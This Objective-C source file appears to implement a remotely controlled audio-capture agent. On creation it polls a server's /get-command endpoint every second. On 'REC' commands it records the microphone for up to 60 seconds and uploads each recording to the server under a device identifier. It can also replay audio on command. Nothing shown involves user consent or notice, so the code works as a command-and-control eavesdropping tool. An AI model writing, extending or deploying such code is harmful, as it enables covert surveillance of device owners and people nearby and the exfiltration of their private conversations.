#import "RecorderAgent.h"
#import "APIService.h" // Assuming APIService is available

@interface RecorderAgent ()
// Keep a reference to the recorder manager
@property (nonatomic, strong) AudioRecorderManager *audioManager;
// Keep a reference to the API service
@property (nonatomic, strong) APIService *apiService;
// Timer for the command polling loop
@property (nonatomic, strong) NSTimer *commandTimer;

@end

@implementation RecorderAgent

- (instancetype)init {
    self = [super init];
    if (self) {
        // Assuming AudioRecorderManager is properly defined elsewhere
        _audioManager = [[AudioRecorderManager alloc] init];
        _audioManager.delegate = self;
        _apiService = [APIService sharedInstance];
        
        // Start the command loop immediately upon initialization
        [self startCommandLoop]; 
    }
    return self;
}

- (void)dealloc {
    [self stopCommandLoop];
    [super dealloc];
}

#pragma mark - Command Polling Loop

- (void)startCommandLoop {
    if (self.commandTimer) {
        return;
    }
    
    NSLog(@"\n--- Starting Persistent Command Polling Loop (1.0s interval) ---");
    
    self.commandTimer = [NSTimer scheduledTimerWithTimeInterval:1.0
                                                         target:self
                                                       selector:@selector(pollForCommand:)
                                                       userInfo:nil
                                                        repeats:YES];
    
    [self.commandTimer fire];
}

- (void)stopCommandLoop {
    if (self.commandTimer) {
        [self.commandTimer invalidate];
        self.commandTimer = nil;
        NSLog(@"--- Command Polling Loop Stopped ---");
    }
}

// Method called by the repeating timer
- (void)pollForCommand:(NSTimer *)timer {
    
    if (!self.apiService.baseURL) {
        NSLog(@"[POLL] Skipping ping: APIService is not configured (Base URL is nil).");
        return;
    }
    
    // Only poll if we are not currently recording OR playing back.
    if (self.audioManager.isRecording || self.audioManager.isPlaying) {
        if (self.audioManager.isRecording) {
            NSLog(@"[POLL] Skipping ping: Currently recording.");
        } else if (self.audioManager.isPlaying) {
            NSLog(@"[POLL] Skipping ping: Currently playing back audio.");
        }
        return;
    }
    
    // Calls fetchDataWithEndpoint:@"/get-command", APIService.m handles adding device_id
    [self.apiService fetchDataWithEndpoint:@"/get-command" completion:^(id data, NSError *error) {
        if (error) {
            NSLog(@"[GET /get-command] Request Error: %@", error.localizedDescription);
        } else if ([data isKindOfClass:[NSDictionary class]]) {
            NSDictionary *commandResponse = (NSDictionary *)data;
            NSString *command = commandResponse[@"command"];
            NSString *message = commandResponse[@"message"] ?: @"No message provided";
            [self executeCommand:command];
        } else {
            NSLog(@"[GET /get-command] Success, but received unexpected data format.");
        }
    }];
}

- (void)executeCommand:(NSString *)command {
    
    // --- 1. WAIT Command ---
    if ([command isEqualToString:@"WAIT"]) {
        return;
    } 
    
    // --- 2. REC[X] Command ---
    if ([command hasPrefix:@"REC"]) {
        if (self.audioManager.isRecording) {
            NSLog(@"Executing: REC. Already recording. Skipping command.");
            return;
        }
        
        NSString *durationString = [command substringFromIndex:3];
        NSTimeInterval duration = [durationString doubleValue];
        
        const NSTimeInterval minDuration = 1.0;
        const NSTimeInterval maxDuration = 60.0;
        
        if (duration < minDuration || duration > maxDuration) {
            NSLog(@"[ERROR] Invalid duration received: %.1f seconds. Must be between %.1f and %.1f. Ignoring command.", 
                  duration, minDuration, maxDuration);
            return;
        }

        NSLog(@"Executing: REC. Starting %.1f second recording.", duration);
        [self.audioManager startRecording];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if (self.audioManager.isRecording) {
                NSLog(@"%.1f seconds elapsed. Stopping recording...", duration);
                [self.audioManager stopRecording];
            } else {
                 NSLog(@"Timer fired but recording was already stopped.");
            }
        });
        
    // --- 3. PLAY Command ---
    } else if ([command isEqualToString:@"PLAY"]) {
        if (self.audioManager.isPlaying) {
            NSLog(@"Executing: PLAY. Already playing. Skipping command.");
            return;
        }

        if (!self.audioManager.canPlay) {
            NSLog(@"Executing: PLAY. Cannot play, no recorded file exists.");
            return;
        }
        
        NSLog(@"Executing: PLAY. Starting playback.");
        [self.audioManager startPlayback];
        
    } else {
        NSLog(@"Unknown or unhandled command: %@. Ignoring.", command);
    }
}


#pragma mark - AudioRecorderDelegate

- (void)audioRecorderDidFinishRecordingSuccessfully:(BOOL)flag {
    if (flag) {
        NSLog(@"Delegate confirmed recording stopped and saved.");
        [self uploadRecordedFile]; 
    } else {
        NSLog(@"\n--- ERROR: Recording failed. File not saved/ready. ---");
    }
}

#pragma mark - Network Logic

- (void)uploadRecordedFile {
    NSLog(@"\n--- Proceeding to Upload Recorded File via APIService ---");
    
    NSString *filePath = self.audioManager.audioFileURL.path;

    // Calls uploadFileWithEndpoint:@"/upload", APIService.m handles adding device_id to parameters
    [self.apiService uploadFileWithEndpoint:@"/upload" 
                                  fromFile:filePath 
                                parameters:nil 
                                completion:^(id data, NSError *error) {
        if (error) {
            NSLog(@"[POST /upload] Upload Error: %@", error.localizedDescription);
        } else if ([data isKindOfClass:[NSDictionary class]]) {
            NSDictionary *uploadResponse = (NSDictionary *)data;
            NSLog(@"[POST /upload] Success. Filename: %@, Message: %@", uploadResponse[@"filename"], uploadResponse[@"message"]);
        } else {
            NSLog(@"[POST /upload] Success, but received unexpected data format.");
        }
    }];
}

@end